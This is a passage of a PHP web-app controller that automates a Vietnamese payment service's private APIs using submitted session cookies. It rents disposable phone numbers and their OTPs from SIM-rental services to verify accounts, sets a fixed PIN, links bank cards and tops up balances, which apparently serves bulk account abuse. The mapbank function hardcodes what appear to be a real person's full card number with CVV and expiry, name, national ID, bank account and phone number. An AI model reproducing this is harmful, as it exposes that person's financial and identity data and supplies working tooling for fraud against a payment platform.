      CURLOPT_HTTPHEADER => array(
        'cookie: ' . $cookie,
        'Content-Type: text/plain'
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return json_decode($response, true);
  }

  function baeminBank($cookie)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://scard.zalopay.vn/v1/bankmap/baemin',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => '{
  "bankCode": "VCCB",
  "platform": "android",
  "appversion": "3.16.0",
  "firstAccountNo": "900704",
  "lastAccountNo": "5485",
  "type": 1
}',
      CURLOPT_HTTPHEADER => array(
        'cookie: ' . $cookie,
        'Content-Type: text/plain'
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return json_decode($response, true);
  }


  function naptien($cookie)
  {

    $t1 = $this->t1($cookie);
    print_r($t1);
    $apptrans = $t1['data']['appTransID'];
    $appuser = $t1['data']['appUser'];
    $apptime  = $t1['data']['appTime'];
    $mac = $t1['data']['mac'];
    $t2 = $this->t2($apptrans, $apptime, $appuser, $mac, $cookie);
    print_r($t2);
    exit(1);
    $ordertoken = $t2['data']['order_token'];
    $softoken = $t2['data']['source_of_fund']['sof_token'];

    // $t3 =  $this->t3($ordertoken,$softoken,$cookie);
    $t4 = $this->t4($cookie, $ordertoken, $softoken);

    $count5 = 0;
    while (true) {
      $statuspay = $this->getStatusPay($cookie, $t4['data']['zp_trans_id_encode']);
      if ($statuspay['error']['code'] != '-17' || $count5 == 5) {
        break;
      }
      $count5++;
      sleep(1);
    }
    return $statuspay['error']['message'];
  }
  // end nap tien zalo


  function mapbank()
  {

    $tb = "";
    $naptien = '';
    $pathfile = '../views/mapbank.php';
    if (isset($_POST['mapbank']) && $_POST['cookie']) {


      $cookie = $_POST['cookie'];
      $_SESSION['cmnd'] = $_POST['cmnd'];
      $_SESSION['bankacc'] = $_POST['bankacc'];
      $_SESSION['bankname'] = $_POST['bankname'];


      if ($_POST['cmnd'] == "113") {
        $_SESSION['cmnd'] = "241851017";
        $_SESSION['bankacc'] = "9007041195485";
        $_SESSION['bankname'] = "CHU QUANG DAT";
      }

      $number = $this->getNumberPhone($cookie);
      if (!isset($number['data']['phoneNumber'])) {
        $tb = "Sai cookie";
      } else {
        $body = "";
        $banktype = $_POST['banktype'];
        switch ($banktype) {
          case "CIMB": {
              $body = '{ "platform": "android", "appVersion": "", "CVV": "882", "type": 0, "cardNumber": "4039500064906692", "holderName": "CHU QUANG DAT", "cardValidFrom": "", "cardValidTo": "1026", "bankCode": "CC", "kYC": { "DOB": "976147200", "fullName": "CHU QUANG DAT", "gender": 1, "idValue": "", "zaloPhone": "84389824667" } }';
            }
        }
        $ZPid =  $this->getZPTransId($cookie, $body)['data']['ZPTransactionID'];

        $count = 0;
        while (true) {
          $status1 = $this->getStatusMapBank($cookie, $ZPid);

          $count++;
          if ($status1['error']['code'] != 46 || $count == 4) break;
          sleep(2);
        }
        $tb = $status1['error']['message'];

        if ($status1['error']['code'] == 48) {
          $pathfile = '../views/mapbankotp.php';
        }
      }
    }
    if (isset($_POST['addbank']) && $_POST['otp']) {
      $cookie = $_POST['cookie'];
      $otp = $_POST['otp'];
      $ZPid = $_POST['zpid'];
      $this->doMapBank($cookie, $otp, $ZPid);
      $code = 0;
      $count = 0;


      while (true) {
        $status = $this->getStatusMapBank($cookie, $ZPid);

        $code = $status['error']['code'];
        $count++;
        if ($code == 1 || $count == 5) {
          break;
        }
        if ($code == 17) {
          $pathfile = '../views/mapbankotp.php';
          break;
        }
        sleep(1);
      }
      $tb = $status['error']['message'];
    }


    $pagename = "LIÊN KẾT NGÂN HÀNG";

    require_once "../views/layout.php";
  }





  function getStatusMapBank($cookie, $id)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://scard.zalopay.vn/v1/bankmap/link/' . $id . '?type=1',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
      CURLOPT_HTTPHEADER => array(
        'cookie: ' . $cookie
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return json_decode($response, true);
  }


  function getNumberPhone($cookie)
  {

    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://sapi.zalopay.vn/v1/user/profile',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
      CURLOPT_HTTPHEADER => array(
        'cookie:' . $cookie
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return json_decode($response, true);
  }


  function getZPTransId($cookie, $body)
  {

    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://scard.zalopay.vn/v1/bankmap/link',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => $body,
      CURLOPT_HTTPHEADER => array(
        'cookie:' . $cookie,
        'Content-Type: text/plain'
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return json_decode($response, true);
  }

  function doMapBank($cookie, $otp, $ZPid)
  {

    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://scard.zalopay.vn/v1/bankmap/authenlink?cookie',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => '{
    "zpTransactionID": "' . $ZPid . '",
    "authenType": 1,
    "authenValue": "' . $otp . '",
    "type": 1
  }',
      CURLOPT_HTTPHEADER => array(
        'cookie: ' . $cookie,
        'Content-Type: text/plain'
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return json_decode($response, true);
  }
  function getbalanceotp($api)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'http://otpsim.com/api/users/balance?token=' . $api,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
    ));

    $response = curl_exec($curl);

    curl_close($curl);

    return json_decode($response, true);
  }

  function cancel($id, $api)
  {

    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://chothuesimcode.com/api?act=expired&apik=' . $api . '&id=' . $id,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
    ));

    $response = curl_exec($curl);

    curl_close($curl);
  }
  function cancelotp($id, $api)
  {

    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'http://otpsim.com/api/sessions/cancel?session=' . $id . '&token=' . $api,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return json_decode($response, true);
  }

  function getcode($id, $api)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://chothuesimcode.com/api?act=code&apik=' . $api . '&id=' . $id,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return json_decode($response, true);
  }
  function getcodeotp($id, $api)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'http://otpsim.com/api/sessions/' . $id . '?token=' . $api,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return json_decode($response, true);
  }

  function getphone($api, $nn)
  {
    if ($nn == 1) $net = "Viettel";
    else if ($nn == 2) $net = "Mobi";
    else if ($nn == 3) $net = "Vina";
    else $net = "VNMB";

    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://chothuesimcode.com/api?act=number&apik=' . $api . '&appId=1176&carrier=' . $net,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    $result = json_decode($response, true);
    return $result;
  }


  function getphoneopt($api, $nn)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'http://otpsim.com/api/phones/request?token=' . $api . '&service=28&network=' . $nn,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    $result = json_decode($response, true);
    return $result;
  }

  function setpin($data, $cookie)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://sapi.zalopay.vn/v1/user/set-phone-pin',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => '{
  "data": "' . $data . '",
  "pin": "937377f056160fc4b15e0b770c67136a5f03c15205b4d3bf918268fefa2c6d0a"
}',
      CURLOPT_HTTPHEADER => array(
        'cookie:' . $cookie,
        'Content-Type: text/plain'
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    $result =   json_decode($response, true);
    return $result;
  }

  function check_zlp_avail($cookie)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://sapi.zalopay.vn/v1/user/info',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
      CURLOPT_HTTPHEADER => array(
        'cookie:' . $cookie
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    $result = json_decode($response, true);
    if (isset($result['data']['hasPIN']) && $result['data']['hasPIN'] == true) {
      return 0;
    } else return 1;
  }

  function submitOTP($data, $otp, $cookie)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://sapi.zalopay.vn/v1/user/submit-authen-phone',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => '{
  "data": "' . $data . '",
  "otp": "' . $otp . '"
}',
      CURLOPT_HTTPHEADER => array(
        'cookie:' . $cookie,
        'Content-Type: text/plain'
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);



    $data = json_decode($response, true);
    if ($data['error']['code'] === 0 || $data['data'] != '') {
      return $data['data'];
    } else {
      return '';
    }
  }


  function getstatus($number, $cookie)
  {

    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://sapi.zalopay.vn/v1/user/get-zpid-by-phone?phone=' . $number,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
      CURLOPT_POSTFIELDS => ' ',
      CURLOPT_HTTPHEADER => array(
        'origin:https://social.zalopay.vn',
        'cookie:' . $cookie,
        'Content-Type: text/plain'
      ),
    ));

    $response = curl_exec($curl);
    curl_close($curl);

    $data = json_decode($response, true);

    if ($data['error']['code'] != 0 && $data['data']['zalopayID'] === '') {
      return 1;
    } else return 0;
  }


  function sendOTP($numberphone, $cookie)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://sapi.zalopay.vn/v1/user/request-authen-phone',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => '{
  "phone": "' . $numberphone . '"
}',
      CURLOPT_HTTPHEADER => array(
        'cookie:' . $cookie . '',
        'Content-Type: text/plain'
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);

    $data = json_decode($response, true);

    if ($data['error']['code'] === 0 &&  $data['data'] != '') {
      return $data['data'];
    } else {
      return '';
    }
  }
}
new home();
